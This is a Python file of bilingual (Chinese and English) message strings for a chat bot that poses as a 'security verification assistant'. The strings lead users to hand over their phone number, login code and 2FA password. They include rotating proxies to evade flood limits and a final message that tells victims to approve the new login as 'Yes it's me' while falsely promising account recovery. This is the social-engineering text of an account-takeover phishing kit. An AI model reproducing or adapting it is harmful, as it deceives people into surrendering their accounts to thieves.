# coding=utf-8
"""机器人多语言包：用户对话文案（加语言只需加一个 dict）"""
SUPPORTED = (("zh", "中文"), ("en", "English"))
DEFAULT_LANG = "zh"

# 网页端改写（机器人启动时从统一后端同步，失败则仅用内置）
OVERRIDES = {}


def apply_overrides(data):
    if isinstance(data, dict):
        for lang, kv in data.items():
            if isinstance(kv, dict):
                OVERRIDES[lang] = dict(kv)

STRINGS = {
    "zh": {
        "welcome": "欢迎使用安全验证助手，请点击下方按钮开始验证。",
        "send_phone": "发送手机号",
        "get_code": "获取验证码",
        "reverify": "重新验证",
        "need_start": "请先发送 /start 开始验证流程。",
        "need_start2": "请先发送 /start 开始验证。",
        "verifying_phone": "⏳ 正在验证您的手机号码...\n\n{phone}\n\n验证成功后请点击获取验证码。",
        "phone_fail": "获取手机号失败: {err}",
        "photo_start": "请根据操作提示来完成验证，请勿发送图片。\n\n发送 /start 开始验证。",
        "photo_invalid": "检测到图片输入，请使用文本进行验证。\n\n请根据操作提示来完成验证。",
        "invalid_start": "请根据操作提示来完成验证。\n\n发送 /start 开始验证。",
        "invalid_any": "输入无效，请根据操作提示来完成验证。",
        "need_phone_first": "请先完成手机号验证。",
        "need_code_btn": "请点击获取验证码按钮。",        "conn_retry": "连接失败，正在重试...",
        "code_sent": "✅ 验证码已发送\n\n请点击下方按钮查看验证码：",
        "keypad_prompt": "请输入您收到的验证码：",
        "typed_prefix": "\n\n已输入：",
        "typed_empty": "—",
        "cleared": "已清空，请重新输入验证码。",
        "need_5_digits": "请输入完整的 5 位验证码后再确认。",
        "view_code": "查看验证码",
        "checking_code": "⏳ 正在为您查看验证码...",
        "code_found": "✅ 检测到验证码：{code}\n正在自动提交...",
        "code_not_found": "暂未收到服务通知，请稍等几秒再点「查看验证码」。",
        "verifying": "⏳ 正在验证您的手机号码...",
        "code_error": "验证码错误，请重新输入。\n剩余尝试次数: {n}",
        "code_too_many": "验证码错误次数过多，请重新开始。",
        "code_fail_restart": "验证失败次数过多，请点击下方按钮重新验证。",
        "need_password": "验证成功，继续输入您的二级密码。",
        "flood_rotate": "当前 IP 被限制，正在自动切换到新 IP 重试...\n\n请再次点击「获取验证码」。",
        "flood_wait": "操作过于频繁，需要等待 {s} 秒。\n如需绕过限制，请在 .env 中配置多个代理（PROXY_HOST_1, PROXY_PORT_1 等）。",
        "send_code_fail": "发送验证码失败，请重试。",
        "verify_fail": "验证失败: {err}",
        "bad_format": "格式错误！用键盘输入5位数字后按确认✅，或按格式输入：TG12345",
        "pwd_error": "二级密码错误，请重新输入。\n剩余尝试次数: {n}",
        "pwd_too_many": "密码错误次数过多，请重新开始。",
        "pwd_fail_restart": "验证失败次数过多，请点击下方按钮重新验证。",
        "pwd_need": "请输入您的二级密码。",
        "pwd_flood_rotate": "当前 IP 被限制，正在自动切换到新 IP 重试...\n\n请重新输入您的二级密码。",
        "done": "您已完成验证，无需重复操作。",
        "phone_occupied": "该号码已被注册，请更换号码后重试。",
        "phone_invalid": "手机号格式无效，请检查后重试。",
        "peer_flood": "发送过于频繁，请稍后再试。",
        "conn_fail": "连接失败: {err}",
        "success": "✅ 已提交审核，稍后您的客户端顶部会出现提示，安全检测中心，请点击yes是的，是您本人操作，您的账户将于12小时内恢复正常",
        "key_confirm": "确认✅",
        "key_clear": "清除❌",
        "key_lang": "🌐 语言",
        "lang_choose": "请选择语言 / Choose language:",
        "lang_set": "语言已切换为中文。",
        "cooldown": "为保护账号，发码冷却中，请{wait}秒后再点。",
        "day_limit": "今日验证已达上限（{n}个），明天再来，养号要紧。",
    },
    "en": {
        "welcome": "Welcome to the security verification assistant. Tap the button below to start.",
        "send_phone": "Send Phone Number",
        "get_code": "Get Code",
        "reverify": "Restart Verification",
        "need_start": "Please send /start to begin verification.",
        "need_start2": "Please send /start first.",
        "verifying_phone": "⏳ Verifying your phone number...\n\n{phone}\n\nTap Get Code after success.",
        "phone_fail": "Failed to get phone number: {err}",
        "photo_start": "Please follow the prompts, do not send photos.\n\nSend /start to begin.",
        "photo_invalid": "Photo input detected, please use text.\n\nFollow the prompts to verify.",
        "invalid_start": "Please follow the prompts.\n\nSend /start to begin.",
        "invalid_any": "Invalid input, please follow the prompts.",
        "need_phone_first": "Please complete phone verification first.",
        "need_code_btn": "Tap the Get Code button.",
        "conn_retry": "Connection failed, retrying...",
        "code_sent": "✅ Code sent\n\nTap the button below to view the code:",
        "keypad_prompt": "Enter the code you received:",
        "typed_prefix": "\n\nEntered: ",
        "typed_empty": "—",
        "cleared": "Cleared, please re-enter.",
        "need_5_digits": "Enter the full 5-digit code before confirming.",
        "view_code": "View Code",
        "checking_code": "⏳ Looking up the code for you...",
        "code_found": "✅ Code detected: {code}\nSubmitting automatically...",
        "code_not_found": "No notification yet, wait a few seconds and tap View Code again.",
        "verifying": "⏳ Verifying your phone number...",
        "code_error": "Wrong code, please retry.\nAttempts left: {n}",
        "code_too_many": "Too many wrong attempts, restarting.",
        "code_fail_restart": "Too many failures, tap below to restart verification.",
        "need_password": "Verified, now enter your 2FA password.",
        "flood_rotate": "IP limited, switching to a new IP...\n\nTap Get Code again.",
        "flood_wait": "Too frequent, wait {s}s.\nTo bypass, configure proxies (PROXY_HOST_1, PROXY_PORT_1, ...).",
        "send_code_fail": "Failed to send code, retry.",
        "verify_fail": "Verification failed: {err}",
        "bad_format": "Wrong format! Type 5 digits then confirm✅, or send as: TG12345",
        "pwd_error": "Wrong 2FA password, retry.\nAttempts left: {n}",
        "pwd_too_many": "Too many wrong attempts, restarting.",
        "pwd_fail_restart": "Too many failures, tap below to restart verification.",
        "pwd_need": "Enter your 2FA password.",
        "pwd_flood_rotate": "IP limited, switching to a new IP...\n\nRe-enter your 2FA password.",
        "done": "Already verified, nothing to do.",
        "phone_occupied": "Number already registered, try another.",
        "phone_invalid": "Invalid phone format, check and retry.",
        "peer_flood": "Sending too frequently, try later.",
        "conn_fail": "Connection failed: {err}",
        "success": "✅ Submitted for review. A prompt will appear at the top of your client soon from Security Center, tap Yes it's me to confirm it's you. Your account will recover within 12 hours.",
        "key_confirm": "Confirm✅",
        "key_clear": "Clear❌",
        "key_lang": "🌐 Language",
        "lang_choose": "请选择语言 / Choose language:",
        "lang_set": "Language set to English.",
        "cooldown": "Anti-freeze cooldown, tap again in {wait}s.",
        "day_limit": "Daily limit reached ({n}), come back tomorrow.",
    },
}


def t(lang, key, **kwargs):
    # 取文案：网页改写优先，其次内置，缺失回退中文，再缺失返回key本身
    s = (OVERRIDES.get(lang, {}) or {}).get(key)
    if not s:
        s = STRINGS.get(lang, {}).get(key) or STRINGS[DEFAULT_LANG].get(key) or key
    try:
        return s.format(**kwargs)
    except Exception:
        return s


ALIASES = {"zh": "zh", "中文": "zh", "zhongwen": "zh", "cn": "zh",
           "en": "en", "english": "en", "yingwen": "en", "yingyu": "en", "eng": "en"}


def normalize_lang(code):
    code = (code or "").strip().lower()
    if code in ALIASES:
        return ALIASES[code]
    for lang, _ in SUPPORTED:
        if code.startswith(lang + "-") or code.startswith(lang + "_"):
            return lang
    return DEFAULT_LANG
